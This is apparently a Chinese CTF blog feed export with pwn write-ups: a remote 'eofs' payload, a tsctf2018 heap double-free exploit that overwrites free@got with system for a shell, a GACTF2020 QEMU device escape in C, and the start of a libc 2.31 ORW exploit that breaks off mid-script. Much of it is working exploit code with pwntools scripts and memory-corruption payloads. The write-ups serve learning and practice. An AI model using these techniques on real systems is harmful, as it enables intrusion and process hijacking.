<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./eofs'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'43.254.3.203'</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'GET / HTTP/1.1#'</span></span><br><span class="line">payload += <span class="string">'Host:127.0.0.1#'</span></span><br><span class="line">payload += <span class="string">'Username:xmzyshypnc#'</span></span><br><span class="line">payload += <span class="string">'ResearchField:'</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x38</span>+<span class="string">'#'</span></span><br><span class="line">payload += <span class="string">'ResearchField:'</span>+<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x602100</span>)+<span class="string">'#'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><img src="/2020/09/03/eofs/6.jpg" alt="flag"></p>
]]></content>
      <categories>
        <category>SUCTF招新赛</category>
      </categories>
  </entry>
  <entry>
    <title>tsctf-HeapAttack</title>
    <url>/2020/09/03/heap_attack/</url>
    <content><![CDATA[<h1 id="tsctf2018-gt-heap-attack"><a href="#tsctf2018-gt-heap-attack" class="headerlink" title="tsctf2018-&gt;heap_attack"></a>tsctf2018-&gt;heap_attack</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近终于磨蹭到了堆的漏洞，刚看完fastbin attack，准备先停一下，做几个题巩固一下，这里的heap_attack是一道比较典型的double free的题目，记录一下</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序一共有三个功能，新建block，编辑block和删除block，这次跟之前做的几道题不太一样的是没有输出函数和溢出漏洞，寻摸了半天也没找到。</p>
<p><img src="/2020/09/03/heap_attack/1.jpg" alt="main"><br><img src="/2020/09/03/heap_attack/2.jpg" alt="newblock"><br><img src="/2020/09/03/heap_attack/3.jpg" alt="delete"><br><img src="/2020/09/03/heap_attack/4.jpg" alt="edit"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在删除这里只是free了堆块，没有清零，存在uaf和double free，这里虽然没有可以泄露函数地址的打印功能，但是程序里有个echo函数给了system地址，以前输入可以溢出的时候可以用uaf构造unlink，现在没有的话就考虑单纯的double free。</p>
<h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><p>新建四个堆块，其中最后一个堆块的内容是’/bin/sh\x00’，第0个堆块的作用是初始化堆。依次删除第一个堆块，第二个堆块，第一个堆块，此时的Bins结果可以看到：<br>main_arena-&gt;chunk_1-&gt;chunk_2-&gt;chunk1<br>再Add(fake_chunk_addr)，使得free bins的指针链表变成：<br>main_arena-&gt;chunk_2-&gt;chunk1-&gt;fake_chunk_addr<br>我们希望这个fake_chunk分配到全局变量s的低地址处且长度为0x70，从而可以覆盖s[i]为free@got，进一步edit即可使得system@plt覆盖free@got，这里使用pwndbg的find_fake_fast,选择一个离s比较近的0x6020bd，Add(p64(0x6020bd))即可</p>
<p><img src="/2020/09/03/heap_attack/5.jpg" alt="fake_chunk"></p>
<p>Add一次，分配的是chunk_2，再Add一次，分配的是chunk_1，再Add一次，分配的是fake_chunk_addr，这里它和s的距离为0x23,输入部分相距0x13，故先填充0x13的’a’，加上free@got即可让s[0]为free@got，再edit(0)覆盖其为system@plt，最后free(chunk3)触发system(‘/bin/sh’)</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">'./heap_attack'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heap_attack'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input ur choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Input content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input ur choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input ur choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Input content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>) </span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>) </span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>) </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'double free'</span></span><br><span class="line">Add(<span class="number">0x60</span>, p64(<span class="number">0x6020bd</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'add 1'</span></span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'add 2'</span></span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'add 1 again'</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span> * <span class="number">19</span> + p64(free_got)) </span><br><span class="line">Edit(<span class="number">0</span>, <span class="string">'\xb0\x07\x40\x00\x00\x00'</span>)<span class="comment">#not p64(system_plt) for the length is 6</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'over flow'</span></span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tsctf2018</category>
      </categories>
  </entry>
  <entry>
    <title>gactf2020</title>
    <url>/2020/09/02/gactf2020/</url>
    <content><![CDATA[<h1 id="GACTF2020"><a href="#GACTF2020" class="headerlink" title="GACTF2020"></a>GACTF2020</h1><h2 id="babyqemu"><a href="#babyqemu" class="headerlink" title="babyqemu"></a>babyqemu</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看下启动脚本，发现自定义了一个设备，应该洞就出在这里</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -kernel /vmlinuz-4.8.0-52-generic  \</span><br><span class="line">    -append <span class="string">"console=ttyS0 root=/dev/ram oops=panic panic=1 quiet"</span>  \</span><br><span class="line">    -initrd /rootfs.cpio  \</span><br><span class="line">    -m 2G -nographic \</span><br><span class="line">    -L /pc-bios -smp 1 \</span><br><span class="line">    -device denc</span><br></pre></td></tr></table></figure>
<p>逆一下找到mmio和pmio，发现有个带范围的地址读/写，调试一下发现0x20处有个elf的函数地址，借此可以得到proc_base进而得到system函数地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">denc_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a3 != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = addr &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &amp; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">0xB20</span> + <span class="number">4</span> * (addr &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">denc_mmio_write</span><span class="params">(<span class="keyword">unsigned</span> __int64 a1, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(addr &amp; <span class="number">3</span>) &amp;&amp; addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)(a1 + <span class="number">0xAF8</span> + addr);</span><br><span class="line">      *(_DWORD *)(<span class="number">4</span> * (addr &gt;&gt; <span class="number">2</span>) + a1 + <span class="number">0xB20</span>) = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">denc_pmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a3 != <span class="number">4</span> || a2 &amp; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">0xB20</span> + <span class="number">4</span> * (a2 &gt;&gt; <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">denc_pmio_write</span><span class="params">(<span class="keyword">unsigned</span> __int64 a1, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(addr &amp; <span class="number">3</span>) &amp;&amp; addr &lt;= <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)(a1 + <span class="number">0xAF8</span> + <span class="number">4</span> * addr);</span><br><span class="line">      *(_DWORD *)(<span class="number">4</span> * addr + a1 + <span class="number">0xB20</span>) = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为好久没调试qemu的题了，这里还是写点备忘，调试的时候先写exp，<code>gcc ./exp.c -static -o exp</code>静态编译后拿<code>find . | cpio -o --format=newc &gt; ../rootfs.cpio</code>打包到文件系统里，启动qemu后拿<code>ps -aux | grep qemu</code>看下进程号，<code>sudo gdb attach -q [pid]</code>跟进去，如果函数调用比较多可以先不attach，等到getchar执行时再跟。</p>
<p><img src="/2020/09/02/gactf2020/1.png" alt="mem"></p>
<p>之后打算找个函数调用的位置，开始没找到，因为IDA的问题，之后查看system_ptr的引用，发现了mmio_read的一处隐藏后门，在输入地址是0x660和0x664时会leak出system_compat函数的libc地址，到这里其实也没什么用，毕竟我们已经有system@plt了，但是这启发了我们去看汇编，终于最后在pmio_write里发现了另一处后门，当输入地址是0x660时触发调用刚才函数指针的位置。参数为偏移为0的地址内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000003AA14A                 cmp     [rbp+var_20], 660h</span><br><span class="line">.text:00000000003AA152                 jnz     short locret_3AA17C</span><br><span class="line">.text:00000000003AA154                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:00000000003AA158                 mov     rax, [rax+0B40h]</span><br><span class="line">.text:00000000003AA15F                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:00000000003AA163                 lea     rcx, [rdx+0B20h]</span><br><span class="line">.text:00000000003AA16A                 mov     edx, 0</span><br><span class="line">.text:00000000003AA16F                 mov     esi, 0</span><br><span class="line">.text:00000000003AA174                 mov     rdi, rcx</span><br><span class="line">.text:00000000003AA177                 call    rax</span><br></pre></td></tr></table></figure>
<p>qemu启动时会通过读取随机数到heap上，每次赋值前要和对应的随机数异或，因此先通过异或0让它们的值leak出，随后写入system@plt以及<code>cat flag</code>字符串</p>
<h3 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint64_t</span>)(inl(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_abread</span><span class="params">(<span class="keyword">uint64_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//return the value of (addr &gt;&gt; 2)</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint64_t</span> offset,<span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    <span class="comment">//pmio_abwrite(0x100,0x12345678);</span></span><br><span class="line">    <span class="comment">//leak proc base</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> proc_high = mmio_read(<span class="number">0x24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proc high 0x%x\n"</span>,proc_high);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> proc_low  = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proc low 0x%x\n"</span>,proc_low);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> proc_base = ((proc_high * <span class="number">0x100000000</span>)+proc_low<span class="number">-3841704</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proc base 0x%llx\n"</span>,proc_base);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = proc_base + <span class="number">0x2ccb60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system addr 0x%llx\n"</span>,system_addr);</span><br><span class="line">    <span class="comment">//leak rand1</span></span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x24</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand1 = ((<span class="keyword">uint32_t</span>)(mmio_read(<span class="number">4</span>))*<span class="number">0x100000000</span>)+((<span class="keyword">uint32_t</span>)mmio_read(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"rand1 val:0x%llx\n"</span>,rand1);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tail = mmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tail val:0x%x\n"</span>,tail);</span><br><span class="line">    <span class="comment">//leak rand2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand2 = ((<span class="keyword">uint32_t</span>)mmio_read(<span class="number">0x24</span>)*<span class="number">0x100000000</span>)+((<span class="keyword">uint32_t</span>)mmio_read(<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"rand2 val:0x%llx\n"</span>,rand2);</span><br><span class="line">    <span class="comment">//write command</span></span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0x20746163</span>^(rand1&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x67616c66</span>^(rand1&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    mmio_write(<span class="number">8</span>,tail);</span><br><span class="line">    <span class="comment">//write system</span></span><br><span class="line">    mmio_write(<span class="number">0x20</span>,(system_addr&amp;<span class="number">0xffffffff</span>)^(rand2));</span><br><span class="line">    mmio_write(<span class="number">0x24</span>,(system_addr&gt;&gt;<span class="number">32</span>)^(rand2&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x660</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>这里有个地方困扰我很久，在写入数据的时候只能写入0/0x20，而不能写入0x4/0x24。之后发现mmio_write函数写的有问题，把uint64_t改成32即可。</p>
<h2 id="card"><a href="#card" class="headerlink" title="card"></a>card</h2><p>libc 2.31，典型的orw题目，这里记一下如何找好用的gadget以及orw的常规思路</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>Add次数最多0x100次，读取的数据首先放到bss段，之后再strcpy拷贝到heap上。出题人可能只想到了strcpy造成的零字节截断，因而预期解是2.29下的off-by-null。实际上因为数据有残留，这里还可以造成off-by-one以及溢出。另外有个后门可以对chunk编辑三次。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_input</span><span class="params">(__int64 a1, <span class="keyword">int</span> sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  memset_0(&amp;temp_data, <span class="number">0L</span>L, sz);</span><br><span class="line">  sub_1160();</span><br><span class="line">  <span class="keyword">return</span> sub_1110(a1, &amp;temp_data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">__int64 __usercall Backdoor@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __int64 a3@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v4 = a3;</span><br><span class="line">  sub_1120();</span><br><span class="line">  <span class="keyword">if</span> ( back_door_times == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1120();</span><br><span class="line">    sub_11B0(<span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  ++back_door_times;</span><br><span class="line">  sub_1140(<span class="string">"Index: "</span>);</span><br><span class="line">  result = sub_143F((__int64)&amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = qword_4460[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)result];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1120();</span><br><span class="line">      sub_1160();                               <span class="comment">// UAF</span></span><br><span class="line">      result = sub_1120();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过off-by-one构造overlapping，配合后门改fd到stdout泄露libc，注意bss的长度其实是有限的，如果数据过长会导致写到非法内存区而失败。此后的做法有两种，一种是free_hook+setcontext，2.31下的setcontext参数由rdx控制，因而需要寻找一些magic_gadget。这里寻找的方式是通过IDA将libc的asm导出到文件中，直接find相应的指令，比如这里我通过vscode搜索<code>mov rdx, [rdi+</code>，即可在libc中找到相关的汇编(这里大概有90条结果，挨个看下)，筛选后得到一个好用的gadget如下。之后分配到free_hook改为magic_gadget并在后面布置frame，free(__free_hook)触发调用即可。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//here</span><br><span class="line">loc_1547A0:</span><br><span class="line">mov     rdx, [rdi+8]</span><br><span class="line">mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure></p>
<p>另一种方式个人觉得实用性更好一点，首先将free_hook改为printf，通过栈上脏数据leak出返回地址位置，通过第三次的UAF改到返回地址处布置rop调用mprotect改栈区为可执行，并跳转到后面的shellcode orw读取flag。官方那边有第一种方式的exp，这里我贴下第二种。</p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span 